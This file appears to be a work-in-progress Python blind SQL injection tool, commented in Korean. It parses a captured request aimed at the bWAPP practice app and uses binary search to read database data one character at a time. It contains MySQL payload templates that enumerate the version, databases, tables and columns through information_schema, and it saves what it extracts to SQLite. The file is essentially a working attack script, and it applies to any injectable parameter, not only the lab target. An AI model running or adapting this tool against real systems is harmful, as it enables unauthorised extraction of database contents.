####################
# 
# 1. POST 문제 해결
# 2. --basic 선택 시 에러 해결
# 3. 데이터 출력 구현,  조회해서 나온 값을 (테이블 생성하고 각 컬럼들 값들을 SQLite에 그대로 저장)
# 4. 다른 데이터베이스 페이로드 생성
# 
###############




# -*- coding: utf-8 -*-   
from time import sleep
import sys
import urllib
import requests
import warnings
import argparse
import sqlite3

warnings.filterwarnings('ignore')



output_check = False
args = None
true_message_size = None # 참(ture)의 경우 message size


REQUEST_STRING = """
GET /bWAPP/sqli_1.php?title=Iron%'+and+1=1+--+&action=search HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
Host: 192.168.219.100:8080
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
Referer: http://192.168.219.100:8080/bWAPP/sqli_1.php
Cookie: PHPSESSID=d1dc9eaac34466eb26f124b19f9e41fa; security_level=0


"""

# def get_argument():
# 	parser = argparse.ArgumentParser()
# 	parser.add_argument("-s",dest="schema", help="http? https?")
# 	parser.add_argument("-p", dest="parameter", help="target param")
# 	parser.add_argument("-d", dest="result_db", help="Database name for storing results ex) -d result_db.db")

# 	parser.add_argument("-D", dest="select_db", help="select DB")
# 	parser.add_argument("-T", dest="select_table", help="select Table")
# 	parser.add_argument("-C", dest="select_column", help="select Column")
# 	# parser.add_argument("-C", type=str, help="select Table")

# 	parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
# 	parser.add_argument("--dbms", dest="dbms", help="SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
# 	parser.add_argument("--basic", action="store_true", help="Basic info extraction")
# 	parser.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
# 	parser.add_argument("--tables", action="store_true", help="Enumerate Tables")
# 	parser.add_argument("--columns", action="store_true", help="Enumerate columns")

# 	options = parser.parse_args()
# 	if not options.parameter or not options.schema:
# 		parser.error("[-] Missing required parameters: --param, --schema are required. Use --help for more info.")
# 	return options
class Colors:
	""" ANSI color codes """
	BLACK = "\033[0;30m"
	RED = "\033[0;31m"
	GREEN = "\033[0;32m"
	BROWN = "\033[0;33m"
	BLUE = "\033[0;34m"
	PURPLE = "\033[0;35m"
	CYAN = "\033[0;36m"
	LIGHT_GRAY = "\033[0;37m"
	DARK_GRAY = "\033[1;30m"
	LIGHT_RED = "\033[1;31m"
	LIGHT_GREEN = "\033[1;32m"
	YELLOW = "\033[1;33m"
	LIGHT_BLUE = "\033[1;34m"
	LIGHT_PURPLE = "\033[1;35m"
	LIGHT_CYAN = "\033[1;36m"
	LIGHT_WHITE = "\033[1;37m"

	BOLD = "\033[1m"
	FAINT = "\033[2m"
	ITALIC = "\033[3m"
	UNDERLINE = "\033[4m"
	BLINK = "\033[5m"
	NEGATIVE = "\033[7m"
	CROSSED = "\033[9m"
	END = "\033[0m"
	# cancel SGR codes if we don't write to a terminal
	if not __import__("sys").stdout.isatty():
		for _ in dir():
			if isinstance(_, str) and _[0] != "_":
				locals()[_] = ""
	else:
		# set Windows console in VT mode
		if __import__("platform").system() == "Windows":
			kernel32 = __import__("ctypes").windll.kernel32
			kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
			del kernel32

class ArgumentProcessor:
	def __init__(self):
		self.args = self.get_argument()

	def get_argument(self):
		parser = argparse.ArgumentParser()
		parser.add_argument("-s",dest="schema", help="http? https?")
		parser.add_argument("-p", dest="parameter", help="target param")
		parser.add_argument("-d", dest="result_db", help="Database name for storing results ex) -d result_db.db")

		parser.add_argument("-D", dest="select_db", help="select DB")
		parser.add_argument("-T", dest="select_table", help="select Table")
		parser.add_argument("-C", dest="select_column", help="select Column")
		# parser.add_argument("-C", type=str, help="select Table")

		parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
		parser.add_argument("--dbms", dest="dbms", help="SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
		parser.add_argument("--basic", action="store_true", help="Basic info extraction")
		parser.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
		parser.add_argument("--tables", action="store_true", help="Enumerate Tables")
		parser.add_argument("--columns", action="store_true", help="Enumerate columns")

		options = parser.parse_args()
		if not options.parameter or not options.schema: # 수정해야됨
			parser.error("[-] Missing required parameters: --param, --schema are required. Use --help for more info.")
		return options

class SQLiteProcessor:
	@classmethod
	def __init__(cls):
		global cursor, conn
		conn = sqlite3.connect(args.result_db)  # try 사용
		cursor = conn.cursor()

		# 기본 테이블 생성 (DB, Table, Column)
		cursor.execute('CREATE TABLE IF NOT EXISTS basic_info (id INTEGER PRIMARY KEY AUTOINCREMENT, version VARCHAR(255), UNIQUE(Version))')
		cursor.execute('CREATE TABLE IF NOT EXISTS dbs_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), UNIQUE(db_name))')
		cursor.execute('CREATE TABLE IF NOT EXISTS table_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), UNIQUE(db_name, table_name))')
		cursor.execute('CREATE TABLE IF NOT EXISTS column_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), column_name VARCHAR(255), UNIQUE(db_name, table_name, column_name))')
	# def result_table_create():
		
	def result_set_name(insert_db_data, select_table_one=None): # 중복코드 추후 수정
		if args.basic:
			cursor.execute("INSERT OR IGNORE INTO basic_info (version) VALUES (?)", (insert_db_data,))
			conn.commit()			
		elif args.dbs:
			cursor.execute("INSERT OR IGNORE INTO dbs_info (db_name) VALUES (?)", (insert_db_data,))
			conn.commit()
		elif args.tables:
			cursor.execute("INSERT OR IGNORE INTO table_info (db_name, table_name) VALUES (?, ?)", (args.select_db, insert_db_data))
			conn.commit()
		elif args.columns:
			cursor.execute("INSERT OR IGNORE INTO column_info (db_name, table_name, column_name) VALUES (?, ?, ?)", (args.select_db, select_table_one, insert_db_data))
			conn.commit()


def url_encode(item):
	return urllib.parse.quote(item).replace('%20', '+').replace('%3D', '=').replace('%27', '\'').replace('%28','(').replace('%29',')').replace('%3E', '>').replace('%2C', ',').replace('%3C', '<')

def url_decode(item):
	return urllib.parse.unquote(item).replace('+', ' ')

def parse_request(request):
	lines = request.split("\n") # 한줄씩 쪼개서 넣기
	method, path_param, http_ver = lines[1].split() # POST /v1/groups/814a75c9-f187-48c8-8c01-a9805212db0e/files/details?AAA=aaa&BBB=bbb HTTP/2
	headers = {} # 헤더 딕셔너리
	data = {} # GET 파라미터 딕셔너리
	path, param_tmp = path_param.split("?") # param = AAA=aaa&BBB=bbb
	param = param_tmp
	if method == 'GET': # GET방식일경우 
		for line in lines[2:]:
			if ":" in line:
				key, value = line.split(": ")
				headers[key] = value # 딕셔너리에 {헤더 : 값}
		for get_param in param.split("&"):
			key, value = get_param.split("=", 1)
			data[key] = value # 딕셔너리에 {파라미터 : 값}
		url = headers['Host']   
		condition = url_decode(data[args.parameter])

	else: # 이외 POST 등 일경우 body 값 파싱
		headers_string, data_string = REQUEST_STRING.split("\n\n")
		for line in headers_string.split("\n"):
			if ":" in line:
				key, value = line.split(": ")
				headers[key] = value
		for param in data_string.split("&"):
			key, value = param.split("=")
			data[key] = value

	return (
	{
		'method': method,
		'url': url,
		'path': path,
		'headers': headers,
		'data': data,
	}, condition
)
def payload_set(condition, payloads):
	result_payload = {}
	for key, value in payloads.items():
		payload_tmp = condition.replace('1=1', value)
		result_payload[key] = payload_tmp

	return result_payload

def setpayload():
	global output_check

	dbms = args.dbms.lower()

	if dbms == 'oracle':
		if args.basic:
			print("[*] Oracle 기본 정보 출력 Start")
			payloads = {

			}
		elif args.dbs:
			print("[*] Oracle DB 출력 Start")
			payloads = {

			}
		else:
			print("Use --help for more info. (oracle)")

	elif dbms == 'mysql':
		if args.basic:
			print(f"{Colors.RED}{Colors.UNDERLINE}[*] MySQL 기본 정보 출력 Start{Colors.END}\n")
			payloads = {
				'count': "SELECT count(*) FROM @@version",
				'len': "(SELECT length((SELECT @@version)))>{mid_val}",
				'version' : "ascii(substr((SELECT @@version),{substr_index},1))>{mid_val}"      
			}
		if args.dbs:
			print(f"{Colors.RED}{Colors.UNDERLINE}[*] MySQL DB 출력 Start{Colors.END}\n")
			payloads = {
				'count' : "(SELECT count(*) FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema'))>{mid_val}",
				'len' : "(SELECT length((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1)))>{mid_val}",
				'dbs' : "ascii(substr((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1),{substr_index},1))>{mid_val}"
			}
		if args.tables:
			print(f"{Colors.RED}{Colors.UNDERLINE}[*] MySQL 테이블 출력 Start{Colors.END}\n")
			payloads = {
				'count' : "(SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}'))>{mid_val}",
				'len' : "(SELECT length((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1)))>{mid_val}",
				'tables' : "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
			}
		if args.columns:
			print(f"{Colors.RED}{Colors.UNDERLINE}[*] MySQL 컬럼 출력 Start{Colors.END}\n")
			payloads = {
				'count' : "(SELECT count(*) FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}'))>{mid_val}",
				'len' : "(SELECT length((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1)))>{mid_val}",
				'columns' : "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
			}
		else:
			print("Use --help for more info. (mysql)")

	# elif dbms == 'mssql':
	# 	if args.basic:
	# 		print("[*] MSSQL 기본 정보 출력 Start")
	# 		payloads = "----------------------------------------"
	# 	elif args.dbs:
	# 		print("[*] MSSQL DB 출력 Start")
	# 		payloads = "----------------------------------------"
	# 	else:
	# 		print("Use --help for more info. (mssql)")

	# elif dbms == 'postgresql':
	# 	if args.basic:
	# 		print("[*] PostgreSQL 기본 정보 출력 Start")
	# 		payloads = [
	# 			# "'||(CASE WHEN ascii(substr((SELECT version()),{substr_index},1))>{mid_val} THEN '{message}' ELSE 'Characterization' END)||'",
	# 			# "'||(CASE WHEN ascii(substr((SELECT version()),{substr_index},1))>{mid_val} THEN '{message}' ELSE '11111' END)||'"
	# 		]
	# 	elif args.dbs:
	# 		print("[*] PostgreSQL DB 출력 Start")
	# 		payloads = "----------------------------------------"
	# 	else:
	# 		print("Use --help for more info. (postgresql)")

	# else:
	# 	print("Unsupported DBMS. Use --help for more info.")
	
	return payloads

def check_condition(data, method, url, path, headers):
	global true_message_size
	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
	proxies = {'http': args.proxy, 'https': args.proxy}
	timeout = 30
	if method == 'GET':
		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
		true_message_size = len(response.content)
	else:
		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
	
def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows=None, select_db=None, select_table=None, select_column=None):
	mid_val = int((min_val+max_val)/2)
	payload_insert = payload_fix
	payload_insert = payload_insert.format(rows=rows, substr_index=substr_index, mid_val=mid_val, select_db=select_db, select_table=select_table, select_column=select_column)
	# print(payload_insert) # 페이로드 확인
	data_val['data'][args.parameter] = payload_insert
	
	bin_result = connection(**data_val) # payload 삽입 및 요청
	if max_val - min_val <= 1:
		if bin_result:
			return max_val
		return min_val         
	if bin_result: # 30 130 160 / 2 = 80
		return recursive(mid_val, max_val, data_val, payload_fix, substr_index, rows, select_db, select_table, select_column)
	return     recursive(min_val, mid_val, data_val, payload_fix, substr_index, rows, select_db, select_table, select_column)
		
def connection(data, method, url, path, headers):
	data[args.parameter] = url_decode(data[args.parameter])
	data[args.parameter] = url_encode(data[args.parameter])
	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
	# print(params)
	proxies = {'http': args.proxy, 'https': args.proxy}
	timeout = 30
	if method == 'GET':
		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
	else:
		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)

	if true_message_size == len(response.content):
		return 1    # true
	return 0    # false

def query_start():
	# result_table_create() # 결과를 저장할 SQLite 테이블 생성
	payloads = setpayload() # 인수에 따른 페이로드 셋팅
	data, condition = parse_request(REQUEST_STRING) # 응답데이터 파싱
	check_condition(**data) # True 응답 길이 저장 (참거짓 구분 용도)
	result_payload = payload_set(condition, payloads) # 조건식에서 1=1 을 페이로드로 리플레이스

	# name_str = "" # 한문자 씩 찾아서 저장할 변수
	# name_tmp = [] #  name_str 에 저장된 변수를 append 할 배열변수


	row_count = 1 # 행 개수
	# row_data = [] # 행 배열
	# col_count = 1 # 열 개수
	# col_data = [] # 열 배열
	result_tmp = []
	result_data = {}
	data_len  = 0
	dic = {} # name_str_list 2차원 배열을 엑셀에 넣기위해 딕셔너리형으로 변환 해서 넣을 변수
	select_table_one = None

	if args.select_table != None: # 테이블의 컬럼을 여러개 선택하는 경우 ex) -C blog, movies
		select_tables = args.select_table.split(',')
		for select_table_one in select_tables: # 컬럼 여러개 선택한 경우 갯수만큼 반복
			select_table_one = select_table_one.replace("'","").strip()

			row_count = recursive(0, 127, data, result_payload['count'],None, None, args.select_db, select_table_one, None)

			# name_str_list =[[None] * 1 for _ in range(row_count)] # 2차원 배열 생성 열을 지정할 방법 생각해야됨
			print(f"[*] '{select_table_one}' 레코드 수 : {str(row_count)}")
			for rows in range(0, row_count, 1):  # 레코드 갯수 만큼 반복  # range(row_count)로 해도됨
				for key, value in list(result_payload.items())[1:]: #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
					if key == 'len':
						data_len  = recursive(0, 127, data, value, None, rows, args.select_db, select_table_one, None)
						# print(f"{select_table_one} 데이터 길이 : " + str(data_len))
					else:
						name_str = ""
						for substr_index in range(0, data_len, 1): # 데이터 글자 수 만큼 반복
							name_str += chr(recursive(0, 127, data, value, substr_index+1, rows, args.select_db, select_table_one, None))
							# name_str_list[rows][0] = name_str
							# print(name_str)
						SQLiteProcessor.result_set_name(name_str, select_table_one) # SQLite에 데이터 저장
						# result_set_name(name_str, select_table_one)
						result_tmp.append(name_str)
						print(result_tmp)
						
			# table_name =		
			result_data[select_table_one] = result_tmp
			print(f"{Colors.PURPLE}[*] '{select_table_one}'  데이터 : {result_data[select_table_one]}{Colors.END}")
			result_tmp = [] # 레코드 모두 추출 후 초기화

		print(f"{Colors.UNDERLINE}[*] SQLite 저장 완료!!{Colors.END}")
		print(f"\n{Colors.RED}{Colors.UNDERLINE}[*] 최종 결과{Colors.END}")
		for key, value in result_data.items(): 
			print(f"{Colors.LIGHT_BLUE}{key}{Colors.END} : {Colors.GREEN}{value}{Colors.END}")	
		print("\n")	
				# print(f"[+] {rows+1} 행 출력 : {name_str}")
 
	# for rows in range(0, row_count, 1): # range(row_count)로 해도됨

	# 	for cols in range(0, row_count, 1):
	# 		print(cols)
	# 		for key, value in result_payload.items():
	# 			if key == 'count':
	# 				continue
	# 			elif key == 'len':
	# 				data_len  = recursive(0, 127, data, value, None, rows, None)
	# 				# print("길이 : " + str(data_len))
	# 			else:
	# 				name_str = ""
	# 				for substr_index in range(0, data_len, 1):
	# 					name_str += chr(recursive(0, 127, data, value, substr_index+1, rows, None))
	# 					name_str_list[rows][0] = name_str
	# 					# print(name_str)
	# 				print(f"[+] {rows+1} 행 출력 : {name_str}")
	

		# 			print(name_str)
		# name_tmp.append(name_str)
		# name_str = ""
		# name_str_list[rows][0] = name_tmp
		# name_tmp = []

	# print("\n[*] 최종 데이터 출력")
	# for i in name_str_list :
	# 	for j in i:
	# 		print(j,end=" ")
	# 	print()
	
	# conn.close()

if __name__ == '__main__':
	arg_processor = ArgumentProcessor()
	args = arg_processor.args # 인스턴스 생성
	# print(args)
	SQLiteProcessor() # SQLite 초기화

	print (f"\n{Colors.RED}{Colors.BOLD}================================================================={Colors.END}")
	print (f"{Colors.RED}{Colors.BOLD}                    Blind SQL Injection START{Colors.END}")
	print (f"{Colors.RED}{Colors.BOLD}================================================================={Colors.END}\n")
	query_start()
